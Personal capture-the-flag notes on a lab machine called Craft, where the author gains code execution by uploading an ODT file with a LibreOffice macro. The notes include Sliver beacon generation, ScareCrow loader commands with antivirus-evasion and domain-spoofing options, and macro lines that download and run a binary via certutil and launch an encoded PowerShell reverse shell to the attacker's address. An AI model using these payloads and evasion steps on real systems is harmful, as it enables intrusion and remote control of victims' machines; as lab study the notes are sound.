# Craft Notes

## Data 

IP: 
OS:
Arch:
Hostname:
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Craft-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X
└─$ iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 


#### Timeline of tasks completed
      
nmapwinx64.png
craftadmin.png

ippsec's .html or .php
indexhtml.png

indexphp.png
submitaodtfile.png

Before I get carrred I checked if we can view the uploads directory 
uploadsdir.png

[[cgi-printenv-http___192.168.180.169_cgi-bin_printenv.pl]]
printenv.png

Proof there is no vhost or admin account 

extensionchangetest.png


appendodt.png

waititis.png

[[missing-sri-http___192.168.180.169_]] https://www.tenable.com/plugins/was/98647

oneminutetopwnagainthen.png

uploadsdirheader.png

libreoffice_macro_exec.png


https://dominicbreuker.com/post/htb_re/

https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/fileformat/libreoffice_macro_exec

https://www.rapid7.com/blog/post/2017/03/08/attacking-microsoft-office-openoffice-with-metasploit-macro-exploits/

https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html
1. Open any LibreOffice application.
2. Go to Tools > Macros > Organize Macros > Basic to open the Basic Macros dialog ([Figure 1](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure0)).
3. Click Organizer to open the Basic Macro Organizer dialog ([Figure 2](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure1)) and select the Libraries tab.
4. Set the Location drop-down to My Macros & Dialogs, which is the default location.
5. Click New to open the New Library dialog (not shown here).
6. Enter a library name, for example TestLibrary, and click OK.
7. On the Basic Macro Organizer dialog, select the Modules tab ([Figure 3](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure2))
8. In the Module list, expand My Macros and select your library (in the example, TestLibrary). A module named Module1 already exists and can contain your macro. If you wish, you can click New to create another module in the library.
9. Select Module1, or the new module that you created, and click Edit to open the Integrated Development Environment (IDE) ([Figure 4](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure3)). The IDE is a text editor and associated facilities that are built into LibreOffice and allow you to create, edit, run, and debug macros.

Organise -> Assign -> Events -> Pick good events

learningtomacro.png


Pun O'Clock sliver-me-libres! 
slivermelibres.png


ITWORKS.png

But no beacon or session.
nobaconorsausage.png

```bash
iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
```

```bash
generate beacon --mtls  192.168.45.173:4445 --arch amd64 --os windows --save /tmp/sliver.bin -f shellcode -G


/opt/ScareCrow/ScareCrow -I /tmp/sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 

GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

upx 

mtls -L 192.168.45.173 -l 4445
```

Tried `C:\Windows\Temp`, but I probably did not have permissions as this is most probably a later Windows 10 machine, I also add simple PowerShell reverse shell just because it is a CTF so more attempt in one go the better.
```vb
Shell("certutil.exe -urlcache -split -f 'http://192.168.45.173/install.exe' 'C:\programdata\install.exe'")
Shell("C:\programdata\install.exe")
Shell("powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAzACcALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA")
```

I aloso may have failed as I also add the event when the application is closed which may have over written the sliver beacon


sadness.png